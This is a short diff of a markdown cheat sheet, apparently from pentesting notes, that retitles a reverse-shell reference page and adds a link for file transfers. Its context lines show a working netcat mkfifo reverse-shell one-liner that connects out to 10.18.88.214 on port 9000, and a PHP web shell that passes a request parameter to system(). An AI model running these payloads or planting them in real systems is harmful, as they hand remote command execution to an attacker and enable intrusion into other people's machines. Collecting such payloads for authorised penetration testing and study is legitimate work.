@@ -2,7 +2,7 @@
 description: reverse shells for easy and quick reference.
 ---
 
-# Reverse Shells
+# Reverse Shells / File Transfers
 
 ### List of Reverse Shells
 
@@ -20,7 +20,9 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.88.214 9000 >/tmp/f
 <?php system(GET["cmd"]) ?>
 ```
 
+## File Transfers
 
+* [https://github.com/six2dez/pentest-book/tree/master/exploitation](https://github.com/six2dez/pentest-book/tree/master/exploitation)
 
 
 
